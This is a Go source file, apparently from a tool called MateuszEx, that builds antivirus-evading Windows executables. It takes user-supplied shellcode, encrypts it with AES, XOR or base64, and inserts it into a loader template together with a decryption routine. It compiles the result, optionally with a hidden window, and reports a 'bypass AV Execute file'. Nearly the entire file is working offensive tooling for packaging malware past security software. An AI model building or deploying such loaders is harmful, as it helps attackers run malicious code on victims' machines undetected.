package core

import (
	"MateuszEx/config"
	"embed"
	"fmt"
	"os"
	"os/exec"
	"strings"
)

func Banner(){
	fmt.Println("  __  __       _                     _____      ")
	fmt.Println(" |  \\/  | __ _| |_ ___ _   _ ___ ___| ____|_  __")
	fmt.Println(" | |\\/| |/ _` | __/ _ \\ | | / __|_  /  _| \\ \\/ /")
	fmt.Println(" | |  | | (_| | ||  __/ |_| \\__ \\/ /| |___ >  < ")
	fmt.Println(" |_|  |_|\\__,_|\\__\\___|\\__,_|___/___|_____/_/\\_\\")
	fmt.Println("")
}
func Usage(){
	fmt.Println("加密方式:")
	fmt.Println("	[a] aes 加密 [b] xor 加密 [c] base64")
	fmt.Println("模板类型:")
	for num,name := range config.TEMPLATE_STATIC_DATA.Template{
		var crypt []string
		if name.Module == "go"{
			crypt = []string{"a","b","c"}
		}
		if name.Module == "c++"{
			crypt = []string{"b"}
		}
		fmt.Println(fmt.Sprintf("	[%d] %s ------> code %s 支持加密: %v",num,name.Name,name.Module,crypt))
	}
}

func Inject(num int,data config.SHELLCODE_DATA,fs embed.FS,kpath string,out string,hidden bool) {
	var text string
	for key,value := range config.TEMPLATE_STATIC_DATA.Template{
		if num == key{
			fmt.Println(fmt.Sprintf("[+] Use template number [%d],Name is %s",key,value.Name))
			text = CreateShortFile(fs,config.TEMPLATE_STATIC_DATA.Template[0].Template,kpath,data)
		}
	}
	if text == ""{
		fmt.Println("[-] template is not found !")
		return
	}
	defer func() {
		tempfile, err := os.Create("C:\\Windows\\Temp\\temp.go")
		if err != nil {
			fmt.Println("[-] Create temp file Failed !")
			return
		}
		n, err := tempfile.WriteString(text)
		defer tempfile.Close()
		fmt.Println(fmt.Sprintf("[+] write size %d byte into file", n))
		defer func() {
			var cmd *exec.Cmd
			if hidden == true {
				cmd = exec.Command("cmd", "/c", "go", "build", "-x", "-v", `-ldflags`, "-s -w -H=windowsgui", "-race", "-o", out, "C:\\Windows\\Temp\\temp.go")
			} else {
				cmd = exec.Command("cmd", "/c", "go", "build", "-x", "-v", `-ldflags`, "-s -w", "-race", "-o", out, "C:\\Windows\\Temp\\temp.go")
			}
			_ = cmd.Start()
			defer func() {
				cmd = exec.Command("cmd","/c","del","/f","/q","C:\\Windows\\Temp\\temp.go")
				err := cmd.Run()
				if err != nil {
					fmt.Println("[-] Remove temp file is faile")
				}
				fmt.Println(fmt.Sprintf("[+] Create bypass AV Execute file %s",out))
			}()
		}()
	}()
}

func CreateShortFile(fs embed.FS,tpath string,kpath string,data config.SHELLCODE_DATA)(string){
	var header string
	var root = "static/decryption/"
	switch kpath {
	case root + "aes.tpl":
		header = `"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"errors"`
	case root + "base64.tpl":
		header = `"encoding/base64"`
	default:
		header = ``
	}


	templ , err := ReadTemplate(fs,tpath)
	if err != nil && templ == "" {
		fmt.Println(fmt.Sprintf("template: %s",err))
	}
	decrypt ,err := ReadTemplate(fs,kpath)
	if err != nil {
		fmt.Println(fmt.Sprintf("decryption: %s",err))
	}
	var enterKey string
	if len(data.Key) == 16{
		enterKey = fmt.Sprintf(`"%v"`,data.Key)
	}else{
		enterKey = data.Key
	}
	decrypt = strings.ReplaceAll(decrypt,"{{key}}",enterKey)
	//fmt.Println(decrypt)
	templ = strings.ReplaceAll(templ,"{{header}}",header)
	templ = strings.ReplaceAll(templ,"{{shellcode}}",data.Shellcode)
	templ = strings.ReplaceAll(templ,"{{decryption}}",decrypt)
	//fmt.Println(templ)
	return templ
}


